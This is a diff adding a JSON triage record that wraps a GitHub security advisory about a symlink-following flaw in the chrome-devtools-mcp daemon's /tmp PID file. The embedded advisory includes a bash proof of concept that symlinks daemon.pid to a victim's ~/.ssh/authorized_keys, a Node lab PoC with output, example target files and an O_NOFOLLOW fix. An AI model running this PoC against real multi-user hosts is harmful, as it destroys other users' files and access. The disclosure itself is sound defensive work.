@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/104685110?v=4\", \"events_url\": \"https://api.github.com/users/enable7997/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/enable7997/followers\", \"following_url\": \"https://api.github.com/users/enable7997/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/enable7997/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/enable7997\", \"id\": 104685110, \"login\": \"enable7997\", \"node_id\": \"U_kgDOBj1eNg\", \"organizations_url\": \"https://api.github.com/users/enable7997/orgs\", \"received_events_url\": \"https://api.github.com/users/enable7997/received_events\", \"repos_url\": \"https://api.github.com/users/enable7997/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/enable7997/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/enable7997/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/enable7997\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-53765\", \"cvss\": {\"score\": 6.1, \"vector_string\": \"CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 6.1, \"vector_string\": \"CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-59\", \"name\": \"Improper Link Resolution Before File Access ('Link Following')\"}], \"description\": \"### Summary\\n\\nThe chrome-devtools-mcp daemon writes its PID file with `fs.writeFileSync()` to a deterministic runtime path. On typical macOS environments, and on Linux sessions where `$XDG_RUNTIME_DIR` is unset, that runtime path falls back to `/tmp/chrome-devtools-mcp-<uid>/daemon.pid`.\\n\\nBecause the write does not use `O_NOFOLLOW`, a local low-privilege user on the same POSIX host can pre-create `/tmp/chrome-devtools-mcp-<victim_uid>/daemon.pid` as a symlink to a file writable by the victim. When the victim later starts daemon mode, `fs.writeFileSync()` follows the symlink and truncates the target file to the daemon PID string.\\n\\nThis report is deliberately scoped to POSIX systems where the daemon falls back to `/tmp`: typical macOS environments and Linux sessions without `$XDG_RUNTIME_DIR`. Windows is out of scope because the default temp directory is per-user and symlink creation has additional privilege requirements.\\n\\n### Details\\n\\nAffected code:\\n\\n`src/daemon/daemon.ts:38-42`\\n\\n```ts\\nconst pidFilePath = getPidFilePath(sessionId);\\nfs.mkdirSync(path.dirname(pidFilePath), {\\n  recursive: true,\\n});\\nfs.writeFileSync(pidFilePath, process.pid.toString());\\n```\\n\\n`src/daemon/utils.ts:49-68`\\n\\n```ts\\nexport function getRuntimeHome(sessionId: string): string {\\n  const platform = os.platform();\\n  const uid = os.userInfo().uid;\\n  const suffix = sessionId ? `-${sessionId}` : '';\\n  const appName = APP_NAME + suffix;\\n\\n  if (process.env.XDG_RUNTIME_DIR) {\\n    return path.join(process.env.XDG_RUNTIME_DIR, appName);\\n  }\\n\\n  if (platform === 'darwin' || platform === 'linux') {\\n    return path.join('/tmp', `${appName}-${uid}`);\\n  }\\n\\n  return path.join(os.tmpdir(), appName);\\n}\\n```\\n\\nThe `/tmp` sticky bit prevents non-owner file removal, but it does not prevent another local user from creating a subdirectory under `/tmp`. If an attacker creates `/tmp/chrome-devtools-mcp-<victim_uid>/` first and places a symlink at `daemon.pid`, the victim's daemon process follows that link when writing the PID.\\n\\nPreconditions:\\n\\n- The victim is on a typical macOS environment where `$XDG_RUNTIME_DIR` is unset, or on a Linux system/session where `$XDG_RUNTIME_DIR` is unset.\\n- The attacker has any local user account on the same host.\\n- The victim later runs a `chrome-devtools` CLI path or MCP integration that starts daemon mode.\\n\\n### PoC\\n\\nRealistic POSIX scenario:\\n\\n```bash\\n# Attacker, before victim starts daemon mode.\\nvictim_uid=1000\\nmkdir -p \\\"/tmp/chrome-devtools-mcp-${victim_uid}\\\"\\nchmod 0755 \\\"/tmp/chrome-devtools-mcp-${victim_uid}\\\"\\nln -s \\\"/home/victim/.ssh/authorized_keys\\\" \\\\\\n      \\\"/tmp/chrome-devtools-mcp-${victim_uid}/daemon.pid\\\"\\n\\n# Victim later starts daemon mode.\\nchrome-devtools start\\n\\n# Result:\\n# fs.writeFileSync follows the symlink, so authorized_keys is truncated to\\n# the daemon PID string.\\n```\\n\\nLab-only PoC that touches only a fresh `os.tmpdir()/cdtmcp-lab-*` directory:\\n\\n```js\\nconst fs = require('node:fs');\\nconst os = require('node:os');\\nconst path = require('node:path');\\n\\nconst lab = fs.mkdtempSync(path.join(os.tmpdir(), 'cdtmcp-lab-'));\\n\\ntry {\\n  fs.chmodSync(lab, 0o755);\\n\\n  const victimSecret = path.join(lab, 'victim-secret.txt');\\n  fs.writeFileSync(\\n    victimSecret,\\n    'IMPORTANT VICTIM CONTENT - MUST NOT BE TRUNCATED\\\\n',\\n  );\\n\\n  const runtimeDir = path.join(lab, 'attacker-pre-created');\\n  fs.mkdirSync(runtimeDir, {recursive: true});\\n\\n  const pidFilePath = path.join(runtimeDir, 'daemon.pid');\\n  fs.symlinkSync(victimSecret, pidFilePath);\\n\\n  // Exact pattern from src/daemon/daemon.ts:39-42.\\n  fs.mkdirSync(path.dirname(pidFilePath), {recursive: true});\\n  fs.writeFileSync(pidFilePath, process.pid.toString());\\n\\n  console.log(fs.readFileSync(victimSecret, 'utf8'));\\n  // -> \\\"<pid>\\\"  (victim file was truncated/overwritten)\\n} finally {\\n  fs.rmSync(lab, {recursive: true, force: true});\\n}\\n```\\n\\nObserved output from the lab PoC:\\n\\n```text\\n[setup] victim secret BEFORE attack:\\n  IMPORTANT VICTIM CONTENT - MUST NOT BE TRUNCATED\\n[attack] symlink placed: <runtimeDir>/daemon.pid -> <victimSecret>\\n[victim ran daemon] victim secret AFTER:\\n  <pid>\\n[lstat pidFile] still symlink\\n[outcome] victim file was overwritten via attacker-placed symlink.\\n```\\n\\nI can provide the standalone `pidfile_symlink_poc.cjs` file if needed. The attached/local version includes platform notes, Windows symlink-permission diagnostics, and cleanup guards.\\n\\n### Impact\\n\\nWho can exploit:\\n\\nAny local user account on the same POSIX host where the victim runs the chrome-devtools-mcp daemon, when `$XDG_RUNTIME_DIR` is unset for that user session.\\n\\nSecurity impact:\\n\\n- Integrity: an attacker can truncate and overwrite any file the victim can write, with content constrained to the daemon PID string.\\n- Availability: critical user configuration files can be corrupted until restored from backup.\\n- Confidentiality: none directly; the written content is only the PID string.\\n\\nExample targets affected by truncation:\\n\\n- `~/.ssh/authorized_keys`, causing the victim to lose SSH access.\\n- `~/.bashrc`, `~/.zshrc`, or `~/.profile`, breaking shell startup.\\n- Project `.env`, `secrets.json`, license files, or line-oriented config files.\\n- Logs or local audit files writable by the victim.\\n\\nSuggested fix:\\n\\nOpen the PID file with `O_NOFOLLOW` and validate runtime directory ownership/permissions before writing:\\n\\n```ts\\nimport {constants, openSync, writeSync, closeSync} from 'node:fs';\\n\\nconst fd = openSync(\\n  pidFilePath,\\n  constants.O_WRONLY |\\n    constants.O_CREAT |\\n    constants.O_TRUNC |\\n    constants.O_NOFOLLOW,\\n  0o600,\\n);\\nwriteSync(fd, process.pid.toString());\\ncloseSync(fd);\\n```\", \"epss\": {\"percentage\": 0.00077, \"percentile\": 0.00161}, \"ghsa_id\": \"GHSA-3pvj-jv98-qhjq\", \"github_reviewed_at\": \"2026-06-17T14:01:04Z\", \"html_url\": \"https://github.com/advisories/GHSA-3pvj-jv98-qhjq\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-3pvj-jv98-qhjq\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-53765\"}], \"nvd_published_at\": null, \"published_at\": \"2026-06-17T14:01:04Z\", \"references\": [\"https://github.com/ChromeDevTools/chrome-devtools-mcp/security/advisories/GHSA-3pvj-jv98-qhjq\", \"https://github.com/advisories/GHSA-3pvj-jv98-qhjq\"], \"repository_advisory_url\": \"https://api.github.com/repos/ChromeDevTools/chrome-devtools-mcp/security-advisories/GHSA-3pvj-jv98-qhjq\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/ChromeDevTools/chrome-devtools-mcp\", \"summary\": \"Chrome DevTools for agents: daemon.pid write follows symlinks in /tmp fallback runtime directory\", \"type\": \"reviewed\", \"updated_at\": \"2026-06-17T14:01:05Z\", \"url\": \"https://api.github.com/advisories/GHSA-3pvj-jv98-qhjq\", \"vulnerabilities\": [{\"first_patched_version\": \"1.1.0\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"chrome-devtools-mcp\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \">= 0.20.0, <= 1.0.1\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-3pvj-jv98-qhjq",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "chrome-devtools-mcp: >= 0.20.0, <= 1.0.1"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-53765"
+    ],
+    "cvss_score": 6.1,
+    "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "chrome-devtools-mcp"
+    ],
+    "remote": false,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-07-20T19:51:58.579685Z",
+  "provenance": {
+    "content_sha256": "89be7dc8f1dd77c305f63888c890f66fa5cb8121764ec89d501b5530e7c492cb",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-06-17T14:01:04Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-3pvj-jv98-qhjq",
+  "status": "active",
+  "title": "Chrome DevTools for agents: daemon.pid write follows symlinks in /tmp fallback runtime directory",
+  "updated_at": "2026-06-17T14:01:05Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-3pvj-jv98-qhjq"
+}
